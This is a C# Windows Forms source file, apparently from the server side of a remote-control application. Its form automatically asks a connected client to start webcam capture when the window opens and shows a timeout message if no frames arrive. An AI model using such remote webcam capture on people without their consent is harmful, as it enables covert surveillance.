using System;
using System.Windows.Forms;
using RemoteControl.Protocals;

namespace RemoteControl.Server
{
    public partial class FrmCaptureVideo : FrmBase
    {
        private SocketSession oSession;
        private bool saveInRealTime = false;
        private int _fps = 5;
        private bool _captureAudio = false;
        private bool _receivedFirstFrame = false;
        private Timer _timeoutTimer;

        public FrmCaptureVideo(SocketSession session)
        {
            InitializeComponent();
            this.oSession = session;
            if (this.oSession != null)
            {
                this.Text = "摄像头查看 - " + this.oSession.SocketId;
            }
        }

        private void FrmCaptureScreen_Load(object sender, EventArgs e)
        {
            // Panel增加滚动条
            this.panel1.AutoScroll = true;
            // 根据图像大小，自动调节控件和Image的尺寸
            this.pictureBox1.SizeMode = PictureBoxSizeMode.AutoSize;

            // 窗口打开时自动启动摄像头采集
            AutoStartCapture();
        }

        private void AutoStartCapture()
        {
            if (oSession != null)
            {
                this.toolStripButton2.Checked = true;
                this.toolStripButton2.Text = "停止摄像头";
                this.toolStripSplitButton2.Enabled = false;
                RequestStartCaptureVideo req = new RequestStartCaptureVideo();
                req.Fps = _fps;
                oSession.Send(ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST, req);

                // 设置超时检测，15秒内没有收到任何响应则显示提示
                _timeoutTimer = new Timer();
                _timeoutTimer.Interval = 15000;
                _timeoutTimer.Tick += (s, e2) =>
                {
                    _timeoutTimer.Stop();
                    _timeoutTimer.Dispose();
                    _timeoutTimer = null;
                    if (!_receivedFirstFrame)
                    {
                        this.toolStripStatusLabel1.Text = "摄像头响应超时，可能客户端无摄像头或连接异常";
                        this.toolStripStatusLabel2.Text = "请尝试重新点击“开始摄像头”";
                    }
                };
                _timeoutTimer.Start();
            }
        }
    }
}
